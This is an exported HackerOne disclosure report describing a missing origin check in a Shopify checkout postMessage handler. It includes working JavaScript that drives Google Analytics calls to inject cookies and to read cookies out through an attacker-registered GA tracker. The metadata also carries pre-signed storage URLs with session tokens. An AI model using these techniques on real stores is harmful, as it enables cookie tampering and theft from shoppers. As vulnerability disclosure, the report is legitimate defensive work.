{
  "id": 1081167,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDgxMTY3",
  "url": "https://hackerone.com/reports/1081167",
  "title": "Read/Write arbitrary (non-HttpOnly) cookies on checkout pages via GoogleAnalyticsAdditionalScripts postMessage handler",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2021-01-19T04:11:06.151Z",
  "submitted_at": "2021-01-19T04:11:06.281Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "bored-engineer",
    "url": "/bored-engineer",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/xh0k94drzpd2d2z4bz9b1kbzngbh/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c?response-content-disposition=inline%3B%20filename%3D%22IMG_0330%20%25281%2529.jpg%22%3B%20filename%2A%3DUTF-8%27%27IMG_0330%2520%25281%2529.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVWHFSNNE%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T140351Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCZLzSSHKxWIGhQtGT81DYUaazxK%2BA4b%2BeBse1XlfNIBwIgfPS8dRNp%2FxmFBCNrWLDxkracRrBYrm5cEg%2BjJDXIvNsqsgUIdRADGgwwMTM2MTkyNzQ4NDkiDNaBwIyE1dVL1zGF0iqPBeiofcLE831cuz%2Fg3%2FBj%2BOAUaL0qSPB0iFluwPLKGuVB6sGEff4eb%2BhiIZV7BGnszG7nUhp9GzIuA1YXeX1txWBdpF9oemEmi5NywysgHkWri0j4Huf8Kqc0veGGY9SjOhiXwycQ8YsHi0vPSebpPPXh0TfZnOU4brttYbmYDQt11ba4sYpdhFcGj2JT98cBsee%2Fc5T7bN4P2XDVhPiRuRw9aGFMqvz1hVd7umv69rNFED1JWINyJdd5C%2F6agSSB8sgbH71ksUBWB6gZbJY81x4rscmVfXXofwqa8PBk5Og2PopEsHO5gC2m6ONQs7oHx%2FwcPVQk3JG%2BUI5vzVw25Vs4%2BdZdhcmlVKrn%2B%2FAnPLwb1UVjUdIZ1Bh2A7dxoauy7mugTmVoaADIScHYKRRYQ6ymOT%2B5HZKcppxrXZOnvSp0bLZxAWUdNfX%2BptG8LPBB0HFsGwGHJM3e67F2eH8OPbwOv4CEGzSDxBRn5jAtojFIeM0zYT71ER7JqwYdvVMhHEmS6yzxVkocSBRdqjcwtHkc%2F3o0qHipZYK%2FYAM9qv8hFeWan6Sa185DBwXF3TgIsvbA%2Fcjp8pWqNUeqtz6soCDoRJUku0qJamW5nH6N7sH%2BtO5tJv6FlKTWPWglmSjgtpptDiSnxBFAQX9CJ8spiVo69mOdSoiBjJLiBs9VWBWsOKdxglim0NnAzaWeTydCoRC1TZO3P1tZhKm4UqA86wCtToWZwff54BVenmfxX29vKT622UzSbI49YSFrYIcmrAYj0mP7dMKGXpl0tZCD4BdH226Uje%2FjlE7N5BpXxeyGKIWjtnsKMm2g%2BMxP7x2yGOeguUUjYzkWYTTS1FwwtYRKn3lLwjDgiYO0bzSZF0Ew1bitrgY6sQHIue94FUiYiMOMkDJ9Ayf9fPYms2aIIAO2H9bXmuaR5lH9obA9b%2FPrvjiRxAZ6lxqcr%2B9QPKlzkknLInDxqbq5txCl1Rij1JaLqv%2B4UxnGRb8ZIpj0ICFXmBBF2kEefQwHF5kj7QtGSa2JcGxgdtN3u7o%2BaXyb07mhLfzaH6hd1QUtvhvVRlbD%2FIk%2F25jmafq1vwS1a1GzXy59j%2BKSs8AfLJwUQzk9Ye%2BpIrlwwlAnAww%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=bbac45e107b4bf3e208dc8792dafad6346f56912a01aaed4339084a0654f5c2b"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 1382,
    "url": "https://hackerone.com/shopify",
    "handle": "shopify",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Shopify",
      "twitter_handle": "",
      "website": "https://www.shopify.com",
      "about": "Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2022-12-01T19:34:31.286Z",
  "bug_reporter_agreed_on_going_public_at": "2022-10-15T21:06:23.207Z",
  "team_member_agreed_on_going_public_at": "2022-12-01T19:34:31.148Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "# Background\nShopify shops can be configured with a [Google Analytics integration](https://help.shopify.com/en/manual/reports-and-analytics/google-analytics) within the admin settings for a shop (`/admin/online_store/preferences`).\nThis is a deeper integration than simply including `analytics.js` via a liquid template, for example [ecommerce tracking](https://help.shopify.com/en/manual/reports-and-analytics/google-analytics/google-analytics-setup#basic) can be enabled.\nWithin this functionality \"Additional Google Analytics JavaScript\" can be specified which can reference the (global) `ga` object, ex:\n```js\nga('linker:autoLink', ['bored.engineer']);\n```\nDuring checkout (of a cart), an edge-case occurs: Some functionality is hosted on `checkout.shopify.com` (such as address/payment forms) that the shop owner may wish to fire Google Analytics events for.\nTo resolve this, a `postMessage` based proxy is configured where the `checkout.shopify.com` pages execute the \"Additional Google Analytics JavaScript\" and any calls to the `ga` function (really an event queue) are pushed to the primary shop domain to be fired.\n\n# Summary\nThe `postMessage` handler on the shop domain does not validate the `event.origin` before processing events.\nThis can allow a malicious webpage to send messages which eventually result in function calls on the `ga` object.\nIt is then possible to write arbitrary cookies values (via `document.cookie` injection) which can often lead to other security concerns.\nAdditionally, it is possible to register an additional (attacker controlled) GA tracker, then leverage the [linkid plugin](https://developers.google.com/analytics/devguides/collection/analyticsjs/enhanced-link-attribution) to read any cookie value.\nThis is only exploitable on shops that have a configured Google Analytics integration (not default, but common).\n\n# Vulnerability\nThe vulnerability is pretty straight-forward, exploitation is the more difficult part. \n```js\n// From checkout-b0ace6cd81eb816d383ce78462bdcd5cfc3cfef0055b9ff774fd9de732b3d9d2.js\nfunction r(e) {\n  \"analytics\" === e.data.type && (\"undefined\" == typeof n.calls && (n.calls = []),\n  n.calls = n.calls.concat(e.data.calls),\n  document.body.dispatchEvent(new CustomEvent(\"GoogleAnalyticsEvent\")))\n}\n// [snip]\nwindow.addEventListener(\"message\", r)\n// [snip]\n[{\n    key: \"executeAdditionalScripts\",\n    value: function n() {\n        var e = t.calls;\n        void 0 !== e && (e.forEach(function(e) {\n            var t;\n            (t = window).ga.apply(t, C(e))\n        }),\n        t.calls = [])\n    }\n}]\n// From checkout HTML page\ndocument.body.addEventListener(\"GoogleAnalyticsEvent\", function() {\n  window.GoogleAnalyticsAdditionalScripts.executeAdditionalScripts()\n});\n```\nThe vulnerability can be demonstrated as easily as sending an event like this:\n```js\nvar win = window.open(\"https://bored-engineering-whitehat-2.myshopify.com/20276739/checkouts/0f446f1d92e2d55bb576273ebb3fc89c\")\nsetTimeout(function() {\n  win.frames[0].postMessage({\n    \"type\": \"analytics\",\n    \"calls\": [\n      ['send', 'pageview']\n    ]\n  }, \"*\")\n}, 2000)\n```\nWhich will trigger a pageview event (in the network tab):\n{F1163231}\n\n# Google Analytics APIs\nWe now have a primitive for executing any function with any arugments on the `ga` object.\nI spent a while trying to turn this into XSS, I'm reasonably confident it is not possible.\n\n# Plugin Loading (dead-end, mostly)\nGoogle Analytics supports [plugins](https://developers.google.com/analytics/devguides/collection/analyticsjs/using-plugins) via a \"require\" command, ex:\n```js\nga('require', 'linkid');\n```\nThis also supports custom plugins via a [\"provide\" command](https://developers.google.com/analytics/devguides/collection/analyticsjs/command-queue-reference#provide):\n```js\nfunction MyPlugin(tracker, options) {\n  // ...\n}\nga('provide', 'myplugin', MyPlugin);\n```\nWhile this seems like an easy path to XSS (register [\"eval\"](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval) as a plugin, then call it), we are limited by the [structured clone algorithm](https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Structured_clone_algorithm) which does not allow functions to be serialized.\nAttempting to provide a string such as `\"eval\"` will not be allowed by GA as it checks the type of the input ensure it is a `function`:\n```js\nvar ea = function(a) {\n  return \"function\" == typeof a\n}\n// [snip]\na = a[2];\n// [snip]\nif (this.g && (!qa(b) || \"\" == b || !ea(a)))\n  throw \"abort\";\n```\nHowever, this is still useful as we can load additional plugins from Google as long as they are in a pre-defined allowlist:\n```js\nZd = {\n  ec: 45,\n  ecommerce: 46,\n  linkid: 47\n};\n// [snip]\ny = function(a, b, c, d, e) {\n  if (!ea(Yd.get(b)) && !$d.get(b)) {\n     Zd.hasOwnProperty(b) && J(Zd[b]);\n```\n\n## Registering an additional tracker\nOne of the problems that comes with using or abusing any of the Google Analytics functions is the registered tracker is not attacker controlled. Fortunately, GA allows registering [multiple trackers](https://developers.google.com/analytics/devguides/collection/analyticsjs/creating-trackers) via the `\"create\"` method, ex:\n```js\nga(\"create\", {\n\t\"name\": \"pwn\",\n\t\"trackingId\": \"UA-44361710-4\"\n})\nga(\"pwn.send\", \"pageview\")\n```\nThis will allow any exploits that require to exfiltrating data via Google Analytics.\n\n## Setting cookie values\nLeveraging the `create` method, it is possible to set arbitrary cookie values.\nThis is possible because Google Analytics allows customization in the name of the cookie used (`_ga` by default) via the `cookieName` attribute, ex:\n```js\nga(\"create\", {\n\t\"name\": \"pwn\",\n\t\"trackingId\": \"UA-44361710-4\",\n\t\"cookieName\": \"_custom_ga\"\n})\n```\nInternally, this is implemented via string concatenation into a `document.cookie` call, manually prettified below:\n```js\nzc = function(cookieName, cookieValue, cookiePath, cookieDomain, trackingId, cookieExpire, cookieFlags) {\n\t// Check if the user is opt'd out, bail early\n    optOut = userIsOptedOut(trackingId) ? false : /(^|\\.)doubleclick\\.net$/i.test(document.location.hostname) || \"/\" == cookiePath && /^(www\\.)?google(\\.com?)?(\\.[a-z]{2})?$/.test(cookieDomain) ? false : true;\n    if (!optOut)\n        return false;\n    // Truncate the value past 1200 characters\n    cookieValue && 1200 < cookieValue.length && (cookieValue = cookieValue.substring(0, 1200));\n    // Build the cookie name\n    cookie = cookieName + \"=\" + cookieValue + \"; path=\" + cookiePath + \"; \";\n    // If expiration was specified, add \"expires\" flag\n    cookieExpire && (cookiePath += \"expires=\" + (new Date((new Date).getTime() + cookieExpire)).toGMTString() + \"; \");\n    // If cookieDomain set, add \"domain\" flag\n    cookieDomain && \"none\" !== cookieDomain && (cookiePath += \"domain=\" + cookieDomain + \";\");\n    // Add any additional cookieFlags\n    cookieFlags && (cookiePath += cookieFlags + \";\");\n    // Set the value\n    changed = document.cookie;\n    document.cookie = cookie;\n    if (!(changed = changed != document.cookie))\n        label: {\n            value = getCookie(cookieName);\n            for (idx = 0; idx < value.length; idx++)\n                if (cookieValue == value[idx]) {\n                    changed = true;\n                    break label\n                }\n            changed = false\n        }\n    return changed\n}\n```\nThere is no escaping provided before the `document.cookie = cookie` call which means a malicious `cookieName` can be used to set a cookie, ex:\n```js\nga(\"create\", {\n\t\"name\": \"pwn\",\n\t\"trackingId\": \"UA-44361710-4\",\n\t\"cookieName\": \"injectedCookie=value;\"\n})\n// [snip]\ndocument.cookie = \"injectedCookie=value;=GA1.3.614842418.1609270420; path=/; expires=Thu, 19 Jan 2023 03:18:11 GMT; domain=bored-engineering-whitehat-2.myshopify.com;\"\n```\nBrowsers will ignore unknown flags during calls to `document.cookie` essentially resulting in the following call:\n```js\ndocument.cookie = \"injectedCookie=value;\"\n```\nThis can be re-used multiple times by modifying the `name` of the tracker and repeating the call.\n(warning: speculation) for many sites this can be used in combination with other security issues (ex: setting a CSRF cookie) that implicitly trust cookie values.\n\n## Reading cookie values\nGoogle Analytics has a optional [Enhanced Link Attribution](https://developers.google.com/analytics/devguides/collection/analyticsjs/enhanced-link-attribution) plugin which allows tracking which element was clicked leading to a page load.\nTo accomplish this element IDs are saved in a `_gali` cookie which is then read by Google Analytics and emitted as part of page loads.\nThe name of this cookie is customizable via a `cookieName` property, ex:\n```\nga('require', 'linkid', {\n  'cookieName': 'pwn',\n});\nga('send', 'pageview');\n```\nThis will result in the value of the `pwn` cookie (assuming it is readable) being included in the Google Analytics payloads making it (eventually) accessible from the GA console:\n{F1163232}\n\n\n# P.S. (self?) \"XSS\" on checkout.shopify.com\nI wanted to note one other component of this (the original reason this proxy exists) is the ability to execute arbitrary JavaScript on `checkout.shopify.com` via the \"Additional Google Analytics JavaScript\" setting.\nThis is the [checkout.shopify.com/$shop_id$/sandbox/google_analytics_iframe](https://checkout.shopify.com/20276739/sandbox/google_analytics_iframe) page:\n```js\nwindow.additionalScripts = function() {\n    // JS controlled by the attacker \n};\n// [snip]\n{\n  key: \"receiveMessage\",\n  value: function o(e) {\n    if (e.source === window.parent && \"checkout_context\" === e.data.type) {\n      this.origin = e.origin, window.Shopify = e.data.Shopify, window.__st = e.data.__st;\n      try {\n        window.additionalScripts()\n      } catch (t) {\n        console.error(\"User script error: \", t)\n      }\n    }\n  }\n}\n// [snip]\nvar t = this;\nwindow.addEventListener(\"message\", function(e) {\n  return t.receiveMessage(e)\n}, !1)\n```\nThis is essentially (intentional) XSS by design on the `checkout.shopify.com` domain (an attacker can iframe this page and trigger the `\"checkout_context\"` postMessage).\nI'm not sure if this is intended functionality (it kinda has to be to make this integration work) but it results in an potential malicous actor executing JS on the same domain that handles the payment integrations (but not direct credit card numbers), address auto-complete, etc.\nIt is possible in somewhat contrived/high user interaction scenarios (ex: the attacker opens the initial shop page) to utilize this XSS to intercept address fields or other integration details via `win.frames[<index]` following `var win = window.open(...)`.\nLet me know if you're interested in some PoCs for that or more details.\n\n## Impact\n\nSee description for details.",
  "bounty_amount": "1600.0",
  "formatted_bounty": "$1,600",
  "weakness": {
    "id": 60,
    "name": "Cross-site Scripting (XSS) - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 1163231,
      "file_name": "Screen_Shot_2021-01-18_at_8.03.34_PM.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/1zo5j4durd2gkdrobpdqh90weg9f?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2021-01-18_at_8.03.34_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2021-01-18_at_8.03.34_PM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVWHFSNNE%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T140351Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCZLzSSHKxWIGhQtGT81DYUaazxK%2BA4b%2BeBse1XlfNIBwIgfPS8dRNp%2FxmFBCNrWLDxkracRrBYrm5cEg%2BjJDXIvNsqsgUIdRADGgwwMTM2MTkyNzQ4NDkiDNaBwIyE1dVL1zGF0iqPBeiofcLE831cuz%2Fg3%2FBj%2BOAUaL0qSPB0iFluwPLKGuVB6sGEff4eb%2BhiIZV7BGnszG7nUhp9GzIuA1YXeX1txWBdpF9oemEmi5NywysgHkWri0j4Huf8Kqc0veGGY9SjOhiXwycQ8YsHi0vPSebpPPXh0TfZnOU4brttYbmYDQt11ba4sYpdhFcGj2JT98cBsee%2Fc5T7bN4P2XDVhPiRuRw9aGFMqvz1hVd7umv69rNFED1JWINyJdd5C%2F6agSSB8sgbH71ksUBWB6gZbJY81x4rscmVfXXofwqa8PBk5Og2PopEsHO5gC2m6ONQs7oHx%2FwcPVQk3JG%2BUI5vzVw25Vs4%2BdZdhcmlVKrn%2B%2FAnPLwb1UVjUdIZ1Bh2A7dxoauy7mugTmVoaADIScHYKRRYQ6ymOT%2B5HZKcppxrXZOnvSp0bLZxAWUdNfX%2BptG8LPBB0HFsGwGHJM3e67F2eH8OPbwOv4CEGzSDxBRn5jAtojFIeM0zYT71ER7JqwYdvVMhHEmS6yzxVkocSBRdqjcwtHkc%2F3o0qHipZYK%2FYAM9qv8hFeWan6Sa185DBwXF3TgIsvbA%2Fcjp8pWqNUeqtz6soCDoRJUku0qJamW5nH6N7sH%2BtO5tJv6FlKTWPWglmSjgtpptDiSnxBFAQX9CJ8spiVo69mOdSoiBjJLiBs9VWBWsOKdxglim0NnAzaWeTydCoRC1TZO3P1tZhKm4UqA86wCtToWZwff54BVenmfxX29vKT622UzSbI49YSFrYIcmrAYj0mP7dMKGXpl0tZCD4BdH226Uje%2FjlE7N5BpXxeyGKIWjtnsKMm2g%2BMxP7x2yGOeguUUjYzkWYTTS1FwwtYRKn3lLwjDgiYO0bzSZF0Ew1bitrgY6sQHIue94FUiYiMOMkDJ9Ayf9fPYms2aIIAO2H9bXmuaR5lH9obA9b%2FPrvjiRxAZ6lxqcr%2B9QPKlzkknLInDxqbq5txCl1Rij1JaLqv%2B4UxnGRb8ZIpj0ICFXmBBF2kEefQwHF5kj7QtGSa2JcGxgdtN3u7o%2BaXyb07mhLfzaH6hd1QUtvhvVRlbD%2FIk%2F25jmafq1vwS1a1GzXy59j%2BKSs8AfLJwUQzk9Ye%2BpIrlwwlAnAww%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=7766f5d821b005993cb12f64fc92985607e4c303a31391bedabeeba7f44c5ad1",
      "file_size": 337213,
      "type": "image/png",
      "moderated": null
    },
    {
      "id": 1163232,
      "file_name": "Screen_Shot_2021-01-18_at_7.31.07_PM.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/2d9ympfezd8dnvc5gch0k0u581pi?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2021-01-18_at_7.31.07_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2021-01-18_at_7.31.07_PM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVWHFSNNE%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T140351Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCZLzSSHKxWIGhQtGT81DYUaazxK%2BA4b%2BeBse1XlfNIBwIgfPS8dRNp%2FxmFBCNrWLDxkracRrBYrm5cEg%2BjJDXIvNsqsgUIdRADGgwwMTM2MTkyNzQ4NDkiDNaBwIyE1dVL1zGF0iqPBeiofcLE831cuz%2Fg3%2FBj%2BOAUaL0qSPB0iFluwPLKGuVB6sGEff4eb%2BhiIZV7BGnszG7nUhp9GzIuA1YXeX1txWBdpF9oemEmi5NywysgHkWri0j4Huf8Kqc0veGGY9SjOhiXwycQ8YsHi0vPSebpPPXh0TfZnOU4brttYbmYDQt11ba4sYpdhFcGj2JT98cBsee%2Fc5T7bN4P2XDVhPiRuRw9aGFMqvz1hVd7umv69rNFED1JWINyJdd5C%2F6agSSB8sgbH71ksUBWB6gZbJY81x4rscmVfXXofwqa8PBk5Og2PopEsHO5gC2m6ONQs7oHx%2FwcPVQk3JG%2BUI5vzVw25Vs4%2BdZdhcmlVKrn%2B%2FAnPLwb1UVjUdIZ1Bh2A7dxoauy7mugTmVoaADIScHYKRRYQ6ymOT%2B5HZKcppxrXZOnvSp0bLZxAWUdNfX%2BptG8LPBB0HFsGwGHJM3e67F2eH8OPbwOv4CEGzSDxBRn5jAtojFIeM0zYT71ER7JqwYdvVMhHEmS6yzxVkocSBRdqjcwtHkc%2F3o0qHipZYK%2FYAM9qv8hFeWan6Sa185DBwXF3TgIsvbA%2Fcjp8pWqNUeqtz6soCDoRJUku0qJamW5nH6N7sH%2BtO5tJv6FlKTWPWglmSjgtpptDiSnxBFAQX9CJ8spiVo69mOdSoiBjJLiBs9VWBWsOKdxglim0NnAzaWeTydCoRC1TZO3P1tZhKm4UqA86wCtToWZwff54BVenmfxX29vKT622UzSbI49YSFrYIcmrAYj0mP7dMKGXpl0tZCD4BdH226Uje%2FjlE7N5BpXxeyGKIWjtnsKMm2g%2BMxP7x2yGOeguUUjYzkWYTTS1FwwtYRKn3lLwjDgiYO0bzSZF0Ew1bitrgY6sQHIue94FUiYiMOMkDJ9Ayf9fPYms2aIIAO2H9bXmuaR5lH9obA9b%2FPrvjiRxAZ6lxqcr%2B9QPKlzkknLInDxqbq5txCl1Rij1JaLqv%2B4UxnGRb8ZIpj0ICFXmBBF2kEefQwHF5kj7QtGSa2JcGxgdtN3u7o%2BaXyb07mhLfzaH6hd1QUtvhvVRlbD%2FIk%2F25jmafq1vwS1a1GzXy59j%2BKSs8AfLJwUQzk9Ye%2BpIrlwwlAnAww%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=4af0625e80cc800ef6620df72ebdd626c7e07effa36ebdcfc7ad3028afe71a2d",
      "file_size": 141586,
      "type": "image/png",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": null,
  "vote_count": 10,
  "voters": [
    "jumpydata",
    "shreyaschavhan",
    "n1m0",
    "ltidi",
    "zy9ard3",
    "shivammusic",
    "witchking_h1",
    "assassincode",
    "bossliferaa",
    "idv7"
  ],
  "severity": {
    "rating": "medium",
    "score": 4.2,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "high",
      "privileges_required": "none",
      "user_interaction": "required",
      "scope": "unchanged",
      "confidentiality": "low",
      "integrity": "low",
      "availability": "none"
    }
  },
  "structured_scope": {
    "databaseId": 413,
    "asset_type": "URL",
    "asset_identifier": "your-store.myshopify.com",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
